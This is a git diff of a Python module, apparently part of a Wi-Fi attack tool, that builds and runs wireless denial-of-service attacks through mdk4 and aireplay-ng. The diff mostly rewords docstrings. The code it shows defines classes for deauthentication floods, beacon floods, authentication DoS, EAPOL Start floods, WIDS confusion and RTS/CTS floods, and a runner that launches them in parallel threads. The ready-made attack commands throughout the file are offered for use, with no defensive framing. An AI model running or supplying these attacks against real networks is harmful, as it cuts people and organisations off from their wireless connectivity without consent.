@@ -1,13 +1,16 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
+
 """
-attacks.py - Module implementing various Wi-Fi DoS attack strategies.
+attacks.py - Module with implementation of various DoS attacks for Wi-Fi.
 
 Features:
-- Redirects stdout/stderr to DEVNULL to suppress mdk4 help/manual output.
-- Supports dynamic parameters (pps, threads, power, duration), 
-  where some may not be used in a specific attack, but the interface remains unified.
-- To extend support for SDR, Evil Twin, etc., add corresponding subclasses of Attack.
+- Redirect stdout/stderr to DEVNULL to suppress output of mdk4 help/manuals.
+- Support for dynamic parameters (pps, threads, power, duration),
+where some of them may not be used in a specific attack,
+but the general interface is the same.
+- If necessary to expand for SDR, Evil Twin, etc., you need to
+add the corresponding Attack subclasses.
 """
 
 import os
@@ -16,14 +19,15 @@ import subprocess
 import signal
 import time
 
-DEVNULL = subprocess.DEVNULL  # Shortcut for output redirection
+DEVNULL = subprocess.DEVNULL  # for brevity output redirection
 
 
 class Attack:
     """
-    Base class to describe a DoS attack strategy.
-    Each subclass should override build_command(...) to generate the final command
-    (e.g., using mdk4/aireplay-ng).
+    Base class for describing an attack (DoS strategy).
+    Each subclass must override build_command(...)
+
+    to generate the final command (mdk4/aireplay-ng etc.).
     """
 
     def __init__(self, name):
@@ -31,7 +35,7 @@ class Attack:
 
     def build_command(self, **kwargs):
         """
-        Should be overridden in the subclass.
+        Must be overridden in subclass.
         kwargs may include: pps_level, power_level, duration_level,
         bssid, interface, channel, etc.
         """
@@ -39,15 +43,6 @@ class Attack:
 
     def run(self, pps_level=1, power_level=1, duration_level=1,
             threads_level=1, **kwargs):
-        """
-        Runs the attack in multiple threads (threads_level).
-        
-        :param pps_level: discrete pps level (1..N)
-        :param power_level: (1..N), currently just a placeholder
-        :param duration_level: (1..N) - not always used
-        :param threads_level: number of parallel attack threads
-        :param kwargs: additional parameters such as bssid, interface, channel, etc.
-        """
         threads = []
         for i in range(threads_level):
             t = threading.Thread(
@@ -75,14 +70,13 @@ class Attack:
             print(f"[ERROR] {self.name} failed cmd={cmd}\n{e}")
 
     def stop(self):
-        """Base implementation does nothing."""
         pass
 
 
 class DeauthFlood(Attack):
     """
-    Deauth flood using aireplay-ng.
-    Command: aireplay-ng --deauth 0 -a <bssid> <iface>
+    Deauth flood via aireplay-ng.
+    aireplay-ng --deauth 0 -a <bssid> <iface>
     """
 
     def __init__(self):
@@ -94,7 +88,7 @@ class DeauthFlood(Attack):
 
 class BeaconFlood(Attack):
     """
-    Beacon flood using mdk4 in b-mode.
+    Beacon flood via mdk4 b-режим.
     Example: sudo mdk4 <iface> b -g -s <value>
     """
 
@@ -102,15 +96,14 @@ class BeaconFlood(Attack):
         super().__init__("BeaconFlood")
 
     def build_command(self, interface="", pps_level=1, **kwargs):
-        # Let the speed value = 100 * pps_level
         s_val = 100 * pps_level
         return f"sudo mdk4 {interface} b -g -s {s_val}"
 
 
 class AuthDOS(Attack):
     """
-    Auth DOS using mdk4 in a-mode.
-    Command uses: -a <bssid> and -s <pps>
+    Auth DOS (mdk4 a- mode).
+    -a <bssid>, -s <pps>
     """
 
     def __init__(self):
@@ -123,8 +116,8 @@ class AuthDOS(Attack):
 
 class DeauthFloodMDK(Attack):
     """
-    Deauth Flood using mdk4 in d-mode.
-    Command uses: -B <bssid>, -c <channel>, and -s for random MAC.
+    Deauth Flood via mdk4 d- mode.
+    -B <bssid>, -c <channel>, -s => random MAC
     """
 
     def __init__(self):
@@ -132,14 +125,13 @@ class DeauthFloodMDK(Attack):
 
     def build_command(self, bssid="", channel="", interface="",
                       pps_level=1, **kwargs):
-        # pps_level is implicit in this mode
         return f"sudo mdk4 {interface} d -B {bssid} -c {channel} -s"
 
 
 class EAPOLStartFlood(Attack):
     """
-    EAPOL Start flood using mdk4 in e-mode.
-    Command uses: -t <bssid> and -s for flooding.
+    EAPOL Start flood (mdk4 e- mode).
+    -t <bssid>, -s => flood
     """
 
     def __init__(self):
@@ -152,8 +144,8 @@ class EAPOLStartFlood(Attack):
 
 class WIDSConfusion(Attack):
     """
-    WIDS Confusion using mdk4 in w-mode.
-    Command uses: -e <bssid>, -c <channel>, and -s.
+    WIDS Confusion (mdk4 w- mode).
+    -e <bssid>, -c <channel>, -s
     """
 
     def __init__(self):
@@ -167,20 +159,20 @@ class WIDSConfusion(Attack):
 
 class RTSCTSFlood(Attack):
     """
-    RTS/CTS Flood using mdk4 in z-mode.
+    RTS/CTS Flood (mdk4 z- mode).
     """
 
     def __init__(self):
         super().__init__("RTSCTSFlood")
 
     def build_command(self, interface="", pps_level=1, **kwargs):
-        # Command: mdk4 <iface> z
+        # mdk4 <iface> z
         return f"sudo mdk4 {interface} z"
 
 
 def stop_all_attacks():
     """
-    Stops all running attack processes by killing aireplay-ng and mdk4.
+    pkill aireplay-ng & pkill mdk4 
     """
     try:
         subprocess.run("sudo pkill -f 'aireplay-ng'", shell=True,
